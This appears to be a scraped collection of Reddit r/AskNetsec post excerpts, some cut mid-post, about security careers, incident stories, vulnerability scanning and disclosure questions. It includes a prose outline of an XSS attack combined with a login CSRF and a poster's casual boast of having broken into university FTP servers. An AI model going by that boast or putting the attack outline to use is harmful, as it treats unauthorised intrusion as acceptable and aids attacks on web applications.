0,vulnerability,AskNetsec,How To Get In To Security Auditing,8,ho697f,https://www.reddit.com/r/AskNetsec/comments/ho697f/how_to_get_in_to_security_auditing/,2020-07-10 02:33:35,"Hello all, I am curious on the best path to take to get into security and IT auditing. I am currently a Data Security Analyst and Im coming up on 2 years of experience. I work on an IT team at a medium-sized company (75 employees) but I am the least technical on the team. I am responsible for writing and maintaining policies, performing GRC audits (ITGCs) for our subsidiaries and Corporate parent, as well as some IDS &amp; vulnerability scanning and management. I also complete web application security audits and assessments from customers which are generally 300-900 questions. I know how to read SOC 2 reports but I obviously dont perform the audits. I want to get in to the auditing side full time as I like the work and its a great balance between technical and the business side. My interest would be in SOC2, PCI-DSS, GDPR, or general IT Security compliance. What is the best way to get in to that industry (I.e. certs such as CISA, CASP or SSCP) ? Are technical skills such as knowledge of vulnerabilities and pen-testing useful or is the business side and management skill set preferred? Any feedback on this would be much appreciated!"

I am the sole operator of our IDS, and vulnerability scanning. I feel comfortable in a lot of the sysadmin side of that, but I certainly feel like I lack the hunting ability, and am afraid that if a threat were present in my systems that I would miss them.

Didn't realize until after receiving them that there are some major privacy issues with the cameras - they require your wifi name/password and must connect to their servers for you to view remotely (RTSP disabled). My question is - if I don't care about my pets being spied on and there won't be any network activity to monitor while we're gone, are there any other risks to connecting these cameras to my network for the two weeks we will be gone? Would there be any way for them to access files or install software on my windows machines?

Hoping to keep this as brief as possible, but I could really use some advice here. I recently took on a new role in the InfoSec space. Not only am I new to the role, but the role is new to the company. The company knows with everything going on in the world that they needed to start building up their Security team in addition to their existing IT staff (Help Desk/Admins). With that said, I have very little direction on what to tackle first and there's little to no documentation. There's a few general IT policies (IT policy, Acceptable Use policy) but not much else. I'm honestly at a loss on where to even start. I've tried having a few meetings internally to get a read on some priority issues or what's important to the business so that I can even start to formulate where to start, but I'm not really getting anywhere there. After all, how am I supposed to know what to protect or look at first if I don't know what's important to the business? It's a rather large environment from an end user perspective (few thousand), but only around 500ish endpoints. Most of the users are warehouse/production line workers and do not utilize endpoints or they share based on their roles. The network hardware (Firewalls, routers, switches), VM hosts and a few other pieces of network hardware probably haven't been patched since they were installed. The end devices and servers just automatically pull updates and apply them, so no one is doing patch management. The internal IT team and developers just make changes adhoc, no change management processes in site. Should I try to lay out some more areas for conversation and hopefully get something? Should I try to get some combination of Log Analyzer and Vulnerability Scanners on the network to try and paint some kind of picture? Should I focus on policies? I know nobody is going to be able to give me a magic answer, but have any of you been in a similar situation? What are typically your first priorities/areas of focus when you start at a new company? I know this isn't the full picture and not a lot of detail, but I do not want to go too deep so I can attempt to keep my identity and company anonymous. I'm happy to answer any additional questions. Any help would be deeply appreciated! Thank you in advance for any help or advice!"

The hacker ha s sent emails to both parties to be able to control the communication and changing the source email address : typically, he sends an email to the supplier with a fake financial guy source email - and he sends an email to my company with a fake supplier source email. He does it first by using a fake domain name (changing 1 character) and secondly by using our domain name - which was not possible to block through SPF records as it's a global Email platform used which is part of our SPF also. Do you know what will be the possibilities to avoid such ""attacks"" in the future ? The hacker had access at one time (or maybe still know) to the emails exchanged as his emails had the history of the previous emails.We performed scan of the PCs + change of AD password in our side. For us, it s a vulnerability in supplier side... Second, the hacker has sent an update of the bank account which was part of the discussion (it was about payment of overdue bills). Is it a way to know the origin of this account and know the identity of the hacker ? Are they legal ways to get such information ? Do we have to file a claim to the authorities (office in china and customer in ASIA also)?

It seems that two people might not guaranty an effective control. When buying a SIEM solution always remember that the best one is the more adaptable to the organizations infrastructure: environment, size, and budget. You are considering Qualys and Nessus for Vulnerability Scanner. Both solutions are capable at detecting and managing critical vulnerabilities: - The Qualys Cloud Platform includes a live, threat intelligence feed of real-time security updates as well as asset management and cloud/web application scanning. The interface is easy to manage and provides integrations with Splunk, a SIEM that you are considering to deploy. - Nessus classifies the vulnerabilities into risk-based classes and performs different scans: focused on PCI-DSS compliance, malware, and applications. It is easy to use but the report section could be improved. Regarding to the SIEMs, besides Splunk and AlienVault I would recommend LogRhythm, is a dedicated security vendor that delivers a robust product with built-in file integrity monitoring and host intrusion detection capabilities. It offers flexibility for companies of all sizes and ease of use when deploying and implementing. You can find here: URL more information about the best SIEM solutions so far and other issues related to cybersecurity. Best Regards."

I'm just under 5 years experience total. 1. Forensics. Taking images for a variety of cases and running them through a forensics software platform to investigate. 2. EDR. Managing alerts on an EDR solution along with responding to them. Tuning/creating rules for alert generation. Performing CLI using EDR software on devices via agent to extract information/files. 3. General SoC style alerts investigation. Things from firewall block alerts, IDS block alerts, email alerts, etc. 4. Designing/managing NGFW policies 5. SIEM management. Technical/sysadmin side (though with assistance from the SIEM's creator support site). Also the rules and user management. 6. Running malware through a dynamic testing software that extracts information on its behavior and displays it to the me. I then comb through it looking for IoCs. Ranging from variable stuff (hashes, IPs, domains, ports) to reg key changes and proxy executions. 7. Threat hunting by using solutions such as EDR, but also looking for anomalies in netflow or using live query type solution to query specific things (config changes, policy differences, etc). 8. Top tier support (we were the highest tier someone could escalate to). So I helped respond to our SoC escalations. 9. Managing our SOAR/Response platform. Mainly from the perspective of creating incident types, SOAR response to certain fields/values being entered, and general ticket creation. Along with creating/pulling metrics for the team. 10. Reviewing and responding to vulnerability analysis findings. Arguably my weakest point is anything related to programming. I can figure out eventually, but if you ask me something on the fly I probably wont know. I've never really been into scripting/programming. So if I wanted to progress my career more, start earning those 6 figures, and move past the 5 year mark; what should I concentrate on next?"

Im starting to wonder what to move onto next, this is a good job and I really like my boss but things feel very unorganized at an upper management level and we do not have much buy in for security initiatives and are seen as an annoyance from other IT teams. The CISO/head of IT is kind of a micro manager and derails a lot of the projects we are working on, overall hes biased toward security when it comes to other teams responsibilities and likes to push the panic button on things that in reality dont require us to drop everything and fix. Ive been at this company right out of school and in the beginning it was very policy/compliance heavy and still is at times. Doing more vulnerability management now but that gets repetitive and majority of it is just ensuring x,y,z updates are included in the next patch cycle or going to bother another team to update something. We manage a lot of tools and I dont get to do the more technical work I would like to get exposed to. As a result I feel my technical skills are going stagnant I do some scripting for things here and there. Ive talked to my boss about it and hes given me some things to start working on but it doesnt feel very significant. Im studying to take the oscp for a 3rd time but am still not feeling too strong about it, I would like to get a job as a pentester (just like everyone else). But Im starting to think it may not be a job I personally can get this early on in my career. The blue team side of things is very interesting to me but Ive been so in the mindset of gotta get oscp, so I can get a new job for the past year or so and havent focused directly too much on other areas outside of work tasks. What are some other certifications/training courses I can start looking in to? Ive been reading about some SANs certs geared around windows and linux but Im not sure work will put up that kind of cash nor do I have the money for that right now. Im looking at taking some amazon certifications since that interests me too. I still dont feel confident enough to start going on job interviews, I know thats not the best attitude to have and need to get over that.

To be honest I don't know much about this vulnerability. This is the first I heard about it. What we are using is for this particular site is an AWS EC2 front end. It would hit an application load balancer on AWS and have the HTTPS portion taken care of there of course, then it is handed off to a Windows 2012 R2 server with IIS 7.5 on it. I have been reading up on this vulnerability and it seems that it is not so direct in terms of remediation. One of the items said to make sure the site is forced SSL, and this site is. On the scan report though they show they tested http:// and https:// versions of the site and both had this vulnerability? Other pages I found show that this affects Apache, IIS 5.0 and 6.0, and others. So would our 7.5 not have this vulnerability then?

I just tested this myself to see what would happen. I pretended i was a hacker who had my email and password which with todays tech and methods is not uncommon. I entered the email and password, and then when it asked for the code from the 2FA app i clicked i dont have this It then asked me if i wanted to use one of my backup emails instead i simply clicked i dont have this again. It then asked me for a 25 digit recovery code (which i have just incase). I simply clicked no I was then greeted with a screen saying i can reset my security info but i wont be able to change this again for 30 days. What the hell is this! What is the point of 2FA if a hacker that knows your password can simple bypass every backup and 2FA method i set up and reset all the security info? I am honestly shocked at this setup, not only is this ridiculous, if a hacker did do this then they could essentially take control of the account for 30 days and stop any attempt from the victim getting back in. Surely if you dont have access to any of those recovery methods then you should be locked out until such a time you have them, period."

My excuse for calling them potential vulnerabilities would be due to some exposing file paths for scanner shares, domain user names, printer history (with the ability to extract some documents, or at least file names) and the ability to enter an admin password, since apparently no one sets them. It's my assumption that adding the password protected admin account would block access into seeing what those sensitive subjects are. The only people that should be able to see and edit these would be, obviously, admins. I wanted to gauge the community's thoughts on this. Thanks for reading!"

A typical day looks like this: I get in and check my emails and any open tickets to see if there are any that apply to me or I can help with. Then I'll hop on our endpoint protection dashboard and check for any alerts. If I see any I'll start investigating. Usually they are a false positive or something minor that I can quickly fix. Then I do any work that pops up during the day that falls under the ""data security"" umbrella. Other than that I really don't know what to do. I've begged and pleaded for a SIEM or an IPS but it's ""not in the budget"". Other than endpoint monitoring I have Kiwi Syslog set up to collect logs but there are so many generated I'm not sure how to make them actionable. Another thing I've been doing is going through our old vulnerability assessments and recommending fixes. What can I do better? Any recommendations on things I should add to my daily routine?"

I'm unsure what model they're currently using, but I'll try my best to give the run down, then my question. It appears that 2/5 branches were successfully compromised, having their admin login changed. I personally know the Network Admin for this company and they ensure complicated passwords are used on them. I can 100% vouch for that. He appears to be recovering well and he's thinking it just happened and he caught it. My question is, what options could have been used to compromise a sonic wall in this way? Was a recent vulnerability published that I missed? The only feasible vectors of attack I could see from the outside would be:  An external facing web portal / password guessing  Planted device on the network, to then port scan, locating the sonic wall then doing the password guessing there  Man in the middle?  Something darker / simpler process unknown to me? As I'm typing this, he gave me confirmation that his report was showing a consistent stream of web portal requests from a 218.237.65.93, which after geo locating it, we can find that it's a Korean address.. So unless a VPN was used, that definitely singles out on-site contact. I doubt great lengths were given, seeing that the location of said company is in the middle of nowhere and the offices affected, even more so. Would the only go-to fix for this be to block all out of country traffic? That's always been a best practice to me. I'm curious on how they were able to change the passwords nearly undetected as well, because after I post this, I'll be reviewing my own logs to ensure I wasn't mysteriously hit as well. Hopefully this is a good heads-up to anyone! I'll update this if any new and unusual information is discovered."

Members of an organization, completely outside of the IT domain, are given Macbook Pros with standard non-admin accounts and no root access, for various reasons that seem justifiable even if I don't agree with it. I noticed the other day that a person's computer, from this organization, on my network was listening for incoming SSH connections. I asked to take a look, and while it says that remote login is disabled for their account under settings, running sudo systemsetup -getremotelogin returned Remote Login: On I was also able to attempt connecting to their machine and prompted for a password, and when I asked to look at their /etc/ssh/sshd\_config, I found that password authentication was enabled. These machines have access (over VPN) to very protected data that, if breached, would be a huge scandal. This person did not enable SSH, and I have very good reason to believe that this is the standard configuration for all the Macbook Pros given to members of this organization. This organization is quite large, so a very large number of people are potentially walking around, connecting to different networks potentially all over the world, with machines that are running SSH server with password authentication enabled. Furthermore, these people are not even remotely in a tech domain, and they have minimal to no security hygiene training. Given the organization, it is conceivable to me that they could have shoddy IT policy. I don't know OSX very well, am I missing something here? Is there something about OSX that renders it hardened in this instance?"

It was supremely easy to get hired in IT then. Today I have followed the money and have landed in health care in which infosec is absolutely boring unless you think HIPAA compliance and policies are a great thing. I have done the scope dope motioning in a SOC. I have done the penetration tests for vulnerabilities. I have created policies and procedures for compliance. It all sucks. Companies hate security. They dont want to pay for it and only grudgingly acknowledge it. Government or security councils are the only reason they comply. If you enjoy sitting in meetings then infosec is for you. If you love being the first person blamed for stuff then youll love being infosec. If you love writing and updating policies and procedures youll love infosec. If you love BS risk assessments that nobody wants to complete, few want to remediate and that are only done because the government says so, youll love infosec. If you love creating metrics so you can justify your job to sr mgmt (why am I paying for this system again?) then youll love infosec. Think itd be fun to push a button to run the monthly vulnerability scan, create the report, distribute and then be the one who has to update the spreadsheet acknowledging, typically, the lack of remediation? (Why didnt you update he server. Vendor says we cant. You do know that Wanna Cry is still a thing. Doesnt matter. The thing still runs on Win98.) Youll be answering for it when something gets hacked even though nobody is accountable or cares. Think youll be working with the latest SIEM? Probably not. A competent CIO will likely engage a MSP to do that for you. Youll have the boring pleasure of being the person that they contact when something alerts that needs handling. Then youll make a call to have it looked at because, you know, they dont give you admin access. Separation of duties and all. Youre the middle man. Funny how the job advert was so specific that you needed to know cloud, SIEM, MS, routers, switches and here you sit writing a new hire security orientation. I mean, they expect you to know EVERYTHING but you wont actually DO anything. Perform one risk assessment and tell me youre not already bored. If you are lucky enough to be on a red team that actually has a CIO/CISO that thinks its great for their guys to sit around playing with tools to break into systems and networks, like a govt think-tank, then the job is probably not boring. You know, companies want to make money. Spending on security does not help in that regard. Its like insurance. Its only useful when something gets exploited and then its all your fault even though you didnt have the headcount or budget to actually make a difference. The only infosec job I liked was one where the company culture was A+. Even then the job was boring. But the company made it tolerable. Unfortunately it was in ATL and no amount of sweet culture could overcome the congestion. Yea, its boring. And sucks. Im glad there are young bucks waiting impatiently to get their chance because Im out. Let me know how its going after your 20 years. All that AI should be interesting."

I don't have the courage to look out for credit card information. My data are exposed as well. I can try to delete my account but I lose some discount in orders. Not a huge deal though. So the questions are: \- How do I proceed from here? Do I turn a blind eye and delete my account? I sense that some serious damage could be possible, apart from someone malicious destroying the reputation of the entire business. Impersonation is a nightmare and serious injury is possible from set-up thefts could be possible in the hands of the wrong people. \- I could send them an anonymous email with the vulnerability and how to fix it. But with the right netsec people they could trace back to me. I didn't do something malicious but I am worried If what I did (simply viewing some other peoples data) is considered hacking. \- I can send them an email with my full details and mentioning my good intends to fix the platform and continue to order their delicious food.

I get that I could just get input names, and test each of them without any consideration to options, but that seems like it's not really any sort of coverage at all. It does not explore all functionality of the form to do that. On the backend, one option being set vs. not being set could trigger an entirely different -- and potentially vulnerable -- code path. Just filling an option with an injection test without exhausting option configuration context, isn't really testing the form at all and is just providing surface level analysis.

We had a new hire cry in the bathroom (its not your fault Kyle, we failed collectively, and I'm sure you'll find a new career path you enjoy more), and people cannibalized each other on conference calls while Attila the hun for all I know pillaged our system. I'd like to hear others peoples stories of they can share and take away some lessons both serious and funny &amp;#x200B; I'm old, like your dad old and admittedly its been difficult to keep up pace with IT. I;'m in a new security role while it is interesting its not easy job for someone pushing 60. My company had a cluster of application servers that face the internet, some of which are Windows 2003. As a server manager I made a suggestion to higher ups, the app devs and our security ops team that we should decommission, look for an alternative, or monitor them ( i don't fully understand security monitoring &amp; forensics but I figured we should at least collect the logging from them). I got push back because the integration would be a lot of man power ( security and SIEM team were already overbooked), we can't have downtime the application automates a pretty important business function, and there's no sensitive data hosted the customers just use it to query old static archival information so its not a big deal I was told. This is were I tripped up I let it go I shrugged my shoulders and took it off my agenda. &amp;#x200B; Fast forward a few months a remote desktop vulnerability is released publicly. We patch our servers expect the legacy ones because again there's no sensitive data. What we forgot is that the admin service account password on that cluster is the same as the one on the servers ""we cared about"". So when those servers were exploited, the hacker dumped password files and had the crown jewels. &amp;#x200B; I come in 15 minutes late that day cursing DC traffic having not gone to the bathroom or had coffee yet. My manager back flips into my fucking cubicle demanding I get on a conference call, I protest that I needed to take a huge shit and was cutting it close for a 930 am meeting.

I get on the call and my jaw drops that vulnerable server cluster has been ransomed ware &amp; we quickly realize we don't have the security capability in place to figure out what happened. Worse yet no ones audited this cluster in some time and it looks like some file shares got ransomed too, cherry on top of we never had good controls on what is in our file shares &amp; short cuts were taken with access controls. &amp;#x200B; While everyone is digesting the turd sundae we've given this Monday morning and flinging dirt at each other no is handling the day to day operations. Which is why we didn't notice an alert that an external IP address logged into a web server (""part of a cluster we did care about"") &amp; did some basic recon and quickly noticed corners had been cut regarding our domain and network segmentation. Again not completely your fault Kyle. But the Mongolian Horde at our door step decided to knee cap &amp; ransom ware anything they could access. &amp;#x200B; There is no worse feeling than when some hapless help desk technician on the end of their rope jumps on a call and starts rambling that he has a growing queue of tickets from the workforce that emails aren't coming in and people cant login to anything.

I really like the field, and usually like to read up on papers on my own, but I realized that this left me missing a big chunk of the actual content / work experience which I now realize is far more important than I previously thought. I am young and have made a handful of mistakes in my life, probably more than most people in their lifetime, and I am trying to recover from them and change my attitude to be more on top of things. I have studied computers since a kid, as well as other fields like pharmacology in my free time, and just had a passion for learning about these subjects. **I realized too that I am awful at working in a team as well**, which is one of my main goals to work on as well as limiting my impulsiveness and sensitivity. I realized I took offence to things/comments too easily, and this was a vulnerability in myself that I have been trying to overcome, and I also became a ""people-pleaser"" while not looking at my own goals in life. My ego got the best of me and I believe I was too confident in some of my decisions, and became overconfident. I do not want to go for a security clearance if I am still struggling with mental health issues as I worry I will be a cause of an issue. At what stage is a security clearance needed? How do you remain so calm and collected under the stress of being in the infosec/netsec field? I know I hear the usual ""Shot of Whiskey"" joke for handling stress, but aside from that, how are you able to cope with the stress. I have been working hard on myself mentally and sorting through the thoughts of mine that cause me angst/issues so I can better understand them and where they stem from so I can move on and be functional, but I am just learning more and more that I was looking at the field from an inexperienced perspective. I now realize I have been at the high end of the [dunning kruger effect](URL thinking that I could learn all by myself just from reading papers but now I realize I lack true experience and am coming to realize I know a lot less than I thought I did. Or atleast I think so. Are there any good groups / mentorships for cybersecurity that can help lead me on the right path, because recently, I have been lost and having issues with trust and being on the right path. Also, I was wondering if young people in this field bring anything new innovation-wise, or is it just best to follow the older, more wiser mentors in everything they do. Thanks."

It seems 2 is fixed, they're no longer leaking data. All that's left is 3. In this, I'm trying to give the company in question time to respond, but also to hold them responsible for the users' sake.

I'm currently building a monitoring system for our cloud infrastructure in python, learning a lot about compliance such as SOC 2 and ISO, doing vulnerability testing and even get to RE our software, pentest our webapps/infrastructure, meeting with vendors for POC and a lot of more cool stuff. I'm so thrilled, i've always been a computer freak with a huge passion for netsec ever sience i found good old ""warez"" communities which were competing on who uploads the newest releases the fastest and for that we needed fast connections, so we cracked university's FTP servers to get that sweet 100mbit connection :) I really want to excel in this field, it really is a true passion of mine and i can't even believe i'm getting paid for stuff i was doing home in my underwear. Can you guys give me some pointers on how to constantly improve and excel in this field ?

To give context, I started out as a web, network and mobile penetration tester with a tonne of automation under my belt that significantly reduce the amount of man hours required for the Security Operations team to action requests in there que - including automating Early Warning / Zero Days. I then transitioned accidentally into vulnerability management as I wrote an automation tool that helped distribute hundreds of thousands of vulnerabilities to the respective remediators / owners. The success of this side project led to the business investing in an enterprise solution in which I was part of the project team. During this time, I was heavily involved in the asset management and other mini projects related to integrations for other teams. While I'm at the tail end of this project, I'm also responsible for building the Red Team (almost entirely solo) and now I've been engaged to help other, unrelated teams with there audit issues - specifically how to align better with corporate governance - so I feel I now have a Security Advisory hat on. Don't get me wrong, I absolutely love a challenge (I'm always learning and improving) and I'm not complaining about the amount of work but having said that, I don't sleep much any more, I'm paid probably half the amount of a senior penetration tester who only pen tests Monday-Friday 9-5 and I can't help but look around at some other team members and get jealous of the ""punch in, punch out"" mindset. Am a little naive in thinking this isn't normal? Is it time to look for a new job? Every day I get messages on LinkedIn about 90k (Euro) + benefits salary's for just being the VM guy, or 100k (Euro) for a Senior Penetration Tester (Which I could do in my sleep) and it makes me wonder if people in those positions are really that, or are they also triple teaming like I am currently What are your experiences? Have you been able to stay in your lane? Do you enjoy it? Is the grass just greener on the other side?"

A user used an untrusted proxy on this machine, system-wide (configured in that IE proxy settings area, which then applies to metro UI apps and apparently OneDrive too). After disconnecting the proxy, Malwarebytes began identifying and blocking malicious requests flagged as ""Trojan"" from the OneDrive executable (which was connected to a OneDrive for Business account). The IP address that OneDrive was making requests to was the proxy IP, on very weird port numbers. All malware scans came back clean, but the requests continued for a while. After a while, the requests stopped suddenly. We have yet to try connecting yet another account to it, as we have isolated and sandboxed the machine for obvious reasons. The ports were fairly random... 53343, 55457, 54994, 53460, 52879, etc. If necessary, I can provide the IP address that OneDrive was attempting to contact as it does not seem to be identifiable to the above mentioned computer... it actually seems to be the IP of the aforementioned untrusted proxy used before. Is this computer infected by something malicious? Was this normal functionality of OneDrive in order to connect to its online services? Should all data in the OneDrive be considered compromised? My hope is to identify the following: * First and foremost, why was OneDrive contacting the proxy IP *after* being disconnected from said proxy, for hours following? * Why OneDrive stop trying to contact the IP address?  * Is this computer infected by something malicious? Scans since the incident have been 100% crystal clean. Standard malicious software incident response procedures were engaged following the first few detections. * Is this normal behavior by OneDrive, considering the port numbers? Or is this potentially a vulnerability? * Obviously root cause analysis is ideal, but I'd like to find out if this behavior has been found by others before too, and what the outcome was."

I'm learning how to test for vulnerabilities in sites, (thanks hacker101), signed up to hackerone, got some flags, got invited to a private program (no bounties, but good for exp, right?) And I followed a path out of the programs scope without realising it(the sub domain is a cname to a third party provider), and might have found an sqli vulnerability out there. After realising of gone out of scope, I checked, and the third party provider does have a bug discloser policy(phew), and it looks like they also do bounties on hacker one thru a private program that I obviously don't have access to. I've only been hacking for three days, and while I do have a number of years experience in IT, hacking is completely new and I was hoping for some advice. Regarding the vulnerability, I think it's a blind sqli . I can get three distinct responses out of the server depending on what sqli I try to inject. It seems obvious to me that any incorrect syntax in my injected SQL returns an error message, valid SQL but without the correct data being returned to whatever function is calling it shows a different return, and finally valid data returned is displayed (which would be not so blind if I could figure out how to return a piece of data with these values). So my question is, do I need to do more digging? Do I report to them now, and if so, should I try to do it through hackerone, or do most companies still pay bounties if reported directly? Thanks "

Anyway, if I can, I'd like to get some advice from those of you already in the network security field, especially from any hiring managers, on how to leverage myself better to get my professional foot in IT in general. I just completed a B.S. in cybersecurity and information assurance. I know there are mixed receptions regarding a college degree absent any worthwhile professional experience. That being said, this degree program humbled me on how much there is to this field and laid a solid foundation to continue expanding my knowledge. From reading other posts on here, it seems like it is a rarity to find a job in information security, or more specifically, network security right from the beginning. Most people tend to lateral from systems administration jobs, devops, or networking positions. I'd like to pursue any of those avenues and learn all I can to facilitate my jump into a network security position. Unfortunately, as indicated above, I don't have any professional experience in any IT field. I also currently do not have any industry certifications. Working and going to school full time, along with supporting a family, did not allot much time to try and move into an IT related job or time to study for certifications. My actual experience goes back to when I was a teenager. I toyed with computers extensively, teaching myself how they work, along with some programming. My degree program utilized a lot of lab environments for the purpose of practical application. Building networks, subnetting, vulnerability exploitation, digital forensics, etc. are some examples of what we did. Other than that, I just don't have the professional experience. My question is this: what do you all recommend to be my next step in pursuing an IT career? I apologize if this is lengthy. I just wanted to provide some context. Thanks in advance. "

Part of the company's sales pitch is the service is ""set it and forget it"" meaning that the client has very little involvement in managing anything. We have no access to client environments and little to no knowledge of their environment. I know. So the approach to this will be to just give the client an OVA, they import it, and they don't worry about anything else. Anyway, I've been put in charge of this because I'm the only person who can do the needful. We'll be using openvas because it's free. I've already figured out the appliance deployment/management part of it. But my boss wants me to come up with custom scan configs and reporting templates.

Before that, I worked as a sort of security engineer in a SOC, taking care of all the SOC tools and infrastructure from maintenance and administration perspective. Overall 5 years of experience in infosec. Lately Im feeling work-wise depressed - I don't develop my skills at work, the stuff I do becomes just boring, sometimes I tend to slob around at work. I don't feel too much excitement, which I used to feel. Also I have a feeling that everything I do at work is sort of outdated (the company is years back behind other companies when it comes to infosec and IT in general). Even when I want to do something cool, I get stopped by some boring tasks or projects. I wanted to go to a different company, but I live in a city that has very limited infosec job market. So I thought about getting into DevOps, which seems like a great way to learn a lot of stuff and work with new technologies. Of course it would require spending some time on learning the knowledge and stuff needed for the job. The only thing I'm afraid of is lack of programming skills (I know python, which I use for a lot of things, but other than that - I'm not a great developer) and knowledge related to software development in general. Do you think that would be a good step? Or should I stay with infosec and challenge myself a bit more? Does any of you feel this kind of stagnation? What do you do about that?"

These attacks came from one of our IT employees's machines. When I went to talk to him about what he might be doing, I found that nobody was sitting at his machine (which I isolated and took custody of.) When he returned to his desk and came and talked to me, he claimed no knowledge of the activity. Examining both the normal and span port pcap data, it was revealed that his machine, at the same time, attempted to log into a industry compliance website's ftp server as anonymous:nessus@nessus.org. The attacks on our website are consistent with a nessus scan, as well (directory traversal, xss, etc). This took place at the tail end of the same time that we perform Tenable Securitycenter scans on user workstations, which we have done for years at this same time without incident. After several days looking at his traffic, I remain at a loss as to what could have launched it. I see nothing in his internet history that is a clear culprit, no Nessus agent on his machine, etc. Is it at all possible that Nessus scans somehow passed through his machine into open windows? I can't think how that would happen, but the timing of this occurring when his own machine was being scanned is a bit much of a coincidence to discount entirely. In addition, earlier in the day he was visiting disconnect.me. I have been looking at what features may be included here, but does anyone know if the plugin contains vulnerability scan features?

This was really more of a Senior Analyst role with no direct reports. Not long after joining, I started to notice a few serious red flags, which when combined, have made me question the best approach moving forward. During the first week, my boss (CISO) suddenly changed and the security budget was reduced by 75%, which was a tad concerning considering the original number was incredibly low. This meant that there was no room for any security spending for 12 months. During the same week, my position responsibilities migrated from a half technical/half management role to a half compliance/half management role. Good start. While trying to get my head around the landscape, I noted that monthly vulnerability scans and pen tests were being performed, which is great. However, none of the high/critical findings (of which there are tens of thousands) had been mitigated/resolved over the last 18 months prior to my arrival. This made me dig a lot deeper, and ask myself, what else has been neglected. Unfortunately, I found that everything in the internal environment had been built with zero security considerations. From applications to infrastructure, 99% of BASIC security best practices had been completely ignored. The definition of a hackers playground. Initially, I was very excited, due to the potential to be able to make some significant improvements to the companys security posture. I prepared numerous business cases for various concepts and ideas and over the next couple of months, presented these to the various relevant executives and departments. Many of these also involved no additional expenditure. Unfortunately, every idea fell on deaf ears. I also addressed the abundance of vulnerabilities identified through their vulnerability scanning and pen testing program, however, was told that as long as I show a 10% year-on-year reduction of vulnerabilities, I will get my bonus. But that is not my motivating factor. I genuinely care about the data protection of our userbase and moreover do not want to end up like one of the many news stories where a CISO/Security Manager knowingly sat on a critical vulnerability for years. Industry reputation is way more valuable than any bonus IMHO. Finally, we have an externally managed SOC who have a lengthy binding contract with the company (otherwise I would have pushed to remove them). They are the definition of useless, with a detection time of days and no ability to respond nor any adequate analysis. I should also note that they have unvetted total control over all security technologies in place. Of course, in the eyes of the execs, a SOC == ultimate security. Anyways, I have basically found myself in the position where I have the worst of both worlds: I am not able to utilize the technologies in place in order to make any changes myself, however I do not have the power nor support to make others perform the changes for me. The only reason I have not quit yet is the fact that I dont want give up so early (after only a few months). Especially, seeing as this is my first internal security gig, I have no reference point to compare this to. All my ex-colleagues tell me to run away, but they are also all from purely consulting backgrounds. So my question to the great minds of AskNetSec, particularly those who have worked within internal security teams: is this the norm? Should I push through for a year or so, show a strong will and hope for the best? Or have a simply landed in a bad company and should run for the hills before my reputation and soul is destroyed? TL;DR  new job as security manager; company has the worst security I have seen in many years of consulting; no funding, support nor resources to change anything; do I persist in hope that it improves, or run away?

The KMS would be used to house any credentials required for Kubernetes hosted applications to function such as backend DB credentials or API keys for various endpoints. The IAM would contain credentials for the actual end users accessing the application. While we do not have any specific products in mind we do have a hybrid environment that would allow for this service to reside either in Kubernetes or on dedicated VMs. Also of note, this is a 100% on premise solution for now, so no AWS KMS or Google Cloud KMS is acceptable. My gut feeling is that hosting these services within Kubernetes comes with further exposure than if it resided outside the cluster as dedicated system. I'm willing to admit this may be because of my inexperience with Kubernetes and Docker. But I try not to scream ""I don't like it"" just because I don't understand it. I'm thinking in the terms that the KMS/IAM is the ""crown jewels"" and would be one of the worst systems to be breached. With the recent Docker runc vulnerability (and all those container escape issues before it) it all makes me nervous. I'm reviewing the NIST docs on containerization best practices.

(b) The attacker creates his own site that causes visitors to log in to the vulnerable application using the attacker's credentials (via a CSRF attack against the login function), and then request the page containing the malicious display name. (c) When a victim is induced to visit the attacker's website, she is logged in to the vulnerable application, and the attacker's JavaScript executes.

However, I also know a bigger priority is how important it is to make sure you don't do anything that crashes the system.

Now I'm working on getting CCNA and either moving laterally into a junior network engineer role, or as a SOC 'engineer' within my current SOC ('engineers' here don't really do much actual engineering, just tuning the SIEM, rather than configuring or hardening devices). If I can do that for a few years and perhaps reach for CCNP and/or CCNA Security, as well as some more SIEM vendor certificates, I have this slightly wacky idea of doing freelance consulting (or just consulting) for half the year or so, then spending the rest of my time 'unemployed' smacking my head against a keyboard trying to build on my basic knowledge of windows internals and memory corruption vulnerabilities and find the next MS17-010.

I am interviewing for a SOC Analyst role at a very large gaming company next week. I'm seeking advice and opinions; is this the right move? Should I stay in my current role? Would I enjoy working in a SOC? Should I wait for a better opportunity? **What I'm doing now**: I'm currently a Security Engineer for a mid-sized e-commerce company. I've been with the company for 9+ years but have been in this role for a little over a year. I have a SysAdmin background. I currently work on a very small team with two other Security Engineers and one Compliance Manager. My role is focused on administering and maintaining our web application firewall, database activity monitoring, and anti-virus/malware tools. My day-to-day also involves vulnerability management including web application scanning, assisting with PCI/SOX activities, and assisting with the care and feeding of the other tools the other Engineers are assigned to including SIEM, file audit, access audit, tools. My hours are flexible and I can work from home most days. We don't have a SOC, so most of the monitoring, triage, and investigations are done by me and my team. We have a NOC that will block IPs from time to time. I enjoy my role and the flexibility it provides, but I feel like a jack of all trades and master of none. **The SOC Analyst Role**: As mentioned before, the role is with a very large gaming company. As a gamer myself, the idea of working for a large gaming company like this is very exciting. The company has been hacked in the past so they are definitely invested in their security program which is a great thing. I believe the SOC is being built from the ground up. The role is 6 month contract to hire and has a rotating schedule that changes every 3 months. **Why am I looking for a new job**: My current company is not doing well and the outlook is grim. The company will likely close within the next 6-12 months. This is the main reason why I'm looking. I'm considering the SOC Analyst role since one of my favorite tools in my current role is the web application firewall. I think using this tool and other related tools the way a SOC uses them will increase my skills even further. &amp;#x200B; What do you think? Any feedback would be much appreciated especially if you are currently a SOC Analyst or have worked as a SOC Analyst in the past. Thank you! &amp;#x200B;"

Obviously, the system itself is also a risk. AFAIK, a LN node needs to be able to sign transactions for its channels, so the private key has to be ""hot""(i.e. available at runtime).

